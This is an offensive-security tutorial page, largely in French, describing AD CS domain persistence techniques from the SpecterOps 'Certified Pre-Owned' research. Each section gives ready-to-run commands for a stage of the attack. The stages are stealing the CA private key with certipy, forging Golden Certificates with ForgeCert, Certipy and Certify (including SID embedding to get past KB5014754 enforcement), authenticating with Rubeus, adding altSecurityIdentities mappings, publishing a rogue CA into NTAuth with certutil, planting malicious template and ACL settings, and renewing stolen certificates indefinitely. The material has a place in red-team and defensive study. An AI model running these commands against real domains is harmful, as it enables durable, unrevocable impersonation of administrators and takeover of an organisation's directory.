# Persistance de domaine AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Ceci est un résumé des techniques de persistance de domaine partagées dans [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consultez-le pour plus de détails.

## Falsification de certificats avec des certificats CA volés (Golden Certificate) - DPERSIST1

Comment savoir si un certificat est un certificat CA ?

On peut déterminer qu'un certificat est un certificat CA si plusieurs conditions sont remplies :

- Le certificat est stocké sur le serveur CA, avec sa clé privée protégée par le DPAPI de la machine, ou par du matériel tel qu'un TPM/HSM si le système d'exploitation le supporte.
- Les champs Issuer et Subject du certificat correspondent tous deux au nom distinctif de la CA.
- Une extension "CA Version" est présente exclusivement dans les certificats CA.
- Le certificat ne contient pas de champs Extended Key Usage (EKU).

Pour extraire la clé privée de ce certificat, l'outil `certsrv.msc` sur le serveur CA est la méthode supportée via l'interface graphique intégrée. Néanmoins, ce certificat ne diffère pas des autres stockés dans le système ; par conséquent, des méthodes telles que la [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) peuvent être utilisées pour l'extraction.

Le certificat et la clé privée peuvent également être obtenus avec Certipy à l'aide de la commande suivante :
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Après avoir acquis le certificat CA et sa clé privée au format `.pfx`, des outils comme [ForgeCert](https://github.com/GhostPack/ForgeCert) peuvent être utilisés pour générer des certificats valides :
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> L'utilisateur ciblé pour la falsification de certificat doit être actif et capable de s'authentifier dans Active Directory pour que le processus réussisse. Falsifier un certificat pour des comptes spéciaux comme krbtgt est inefficace.

Ce certificat falsifié sera **valide** jusqu'à la date de fin spécifiée et tant que le certificat CA racine est valide (généralement de 5 à **10+ ans**). Il est aussi valide pour les **machines**, donc combiné avec **S4U2Self**, un attaquant peut **maintenir une persistance sur n'importe quelle machine de domaine** aussi longtemps que le certificat CA est valide.\
De plus, les **certificats générés** avec cette méthode **ne peuvent pas être révoqués** car la CA n'en a pas connaissance.

### Fonctionnement sous l'application stricte du mappage des certificats (2025+)

Depuis le 11 février 2025 (après le déploiement de KB5014754), les contrôleurs de domaine sont par défaut en **Full Enforcement** pour les mappages de certificats. Concrètement, cela signifie que vos certificats falsifiés doivent soit :

- Contenir une liaison forte avec le compte cible (par exemple, l'extension de sécurité SID), ou
- Être associés à un mappage explicite et fort sur l'attribut `altSecurityIdentities` de l'objet cible.

Une approche fiable pour la persistance est de créer un certificat falsifié chaîné à l'Enterprise CA volée puis d'ajouter un mappage explicite et fort au principal victime :
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Remarques
- Si vous pouvez fabriquer des certificats forgés qui incluent l'extension de sécurité SID, ceux-ci seront mappés implicitement même sous Full Enforcement. Sinon, privilégiez des mappages explicites et robustes. Voir [account-persistence](account-persistence.md) pour plus d'informations sur les mappages explicites.
- La révocation n'aide pas les défenseurs ici : les certificats forgés sont inconnus de la base de données CA et ne peuvent donc pas être révoqués.

#### Contrefaçon compatible Full-Enforcement (SID-aware)

Des outils mis à jour permettent d'intégrer le SID directement, en gardant les golden certificates utilisables même lorsque les DCs rejettent des mappages faibles :
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
En incorporant le SID, vous évitez d'avoir à toucher `altSecurityIdentities`, qui peut être surveillé, tout en satisfaisant les contrôles de correspondance stricts.

## Faire confiance à des certificats CA malveillants - DPERSIST2

L'objet `NTAuthCertificates` est destiné à contenir un ou plusieurs **certificats CA** dans son attribut `cacertificate`, utilisé par Active Directory (AD). Le processus de vérification par le **contrôleur de domaine** consiste à consulter l'objet `NTAuthCertificates` pour trouver une entrée correspondant à la **CA spécifiée** dans le champ Issuer du **certificat** authentifiant. L'authentification se poursuit si une correspondance est trouvée.

Un certificat CA auto-signé peut être ajouté à l'objet `NTAuthCertificates` par un attaquant, à condition qu'il contrôle cet objet AD. Normalement, seuls les membres du groupe **Enterprise Admin**, ainsi que les **Domain Admins** ou les **Administrators** du **forest root’s domain**, ont l'autorisation de modifier cet objet. Ils peuvent éditer l'objet `NTAuthCertificates` en utilisant `certutil.exe` avec la commande `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ou en employant le [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Commandes supplémentaires utiles pour cette technique :
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Cette capacité est particulièrement pertinente lorsqu'elle est utilisée en conjonction avec une méthode décrite précédemment impliquant ForgeCert pour générer dynamiquement des certificats.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Les opportunités de **persistence** via des **modifications des security descriptors des composants AD CS** sont nombreuses. Les modifications décrites dans la section "[Domain Escalation](domain-escalation.md)" peuvent être mises en œuvre de manière malveillante par un attaquant disposant d'un accès élevé. Cela inclut l'ajout de « control rights » (par ex., WriteOwner/WriteDACL/etc.) à des composants sensibles tels que :

- L'objet ordinateur AD du **serveur CA**
- Le **serveur RPC/DCOM du serveur CA**
- Tout **objet AD descendant ou conteneur** dans **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **Groupes AD délégataires de droits pour contrôler AD CS** par défaut ou par l'organisation (such as the built-in Cert Publishers group and any of its members)

Un exemple d'implémentation malveillante impliquerait un attaquant disposant de **permissions élevées** dans le domaine, ajoutant la permission **`WriteOwner`** au modèle de certificat par défaut **`User`**, l'attaquant étant le principal pour ce droit. Pour exploiter cela, l'attaquant changerait d'abord la propriété du modèle **`User`** pour se l'attribuer. Ensuite, le **`mspki-certificate-name-flag`** serait défini à **1** sur le modèle pour activer **`ENROLLEE_SUPPLIES_SUBJECT`**, permettant à un utilisateur de fournir un Subject Alternative Name dans la requête. Par la suite, l'attaquant pourrait **enroll** en utilisant le **template**, choisissant un nom de **domain administrator** comme nom alternatif, et utiliser le certificat obtenu pour s'authentifier en tant que DA.

Paramètres pratiques que les attaquants peuvent configurer pour une persistence à long terme (voir {{#ref}}domain-escalation.md{{#endref}} pour les détails complets et la détection) :

- Flags de politique CA qui autorisent les SAN fournis par les demandeurs (par ex., activer `EDITF_ATTRIBUTESUBJECTALTNAME2`). Cela maintient exploitables des chemins de type ESC1.
- DACL ou paramètres de template permettant l'émission pour l'authentification (par ex., ajout de l'EKU Client Authentication, activation de `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Contrôler l'objet `NTAuthCertificates` ou les containers CA pour réintroduire continuellement des rogue issuers si les défenseurs tentent un nettoyage.

> [!TIP]
> Dans des environnements durcis après KB5014754, associer ces mauvaises configurations à des mappings explicites et forts (`altSecurityIdentities`) garantit que vos certificats émis ou forgés restent utilisables même lorsque les DCs appliquent le strong mapping.

### Abus de renouvellement de certificat (ESC14) for persistence

If you compromise an authentication-capable certificate (or an Enrollment Agent one), you can **renew it indefinitely** as long as the issuing template remains published and your CA still trusts the issuer chain. Renewal keeps the original identity bindings but extends validity, making eviction difficult unless the template is fixed or the CA is republished.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Si les contrôleurs de domaine sont en **Full Enforcement**, ajoutez `-sid <victim SID>` (ou utilisez un template qui inclut toujours l'extension de sécurité SID) afin que le leaf certificate renouvelé continue de correspondre fortement sans toucher à `altSecurityIdentities`. Les attaquants disposant des droits d'administrateur CA peuvent aussi modifier `policy\RenewalValidityPeriodUnits` pour allonger la durée de vie des certificats renouvelés avant de s'en émettre un eux-mêmes.

## Références

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
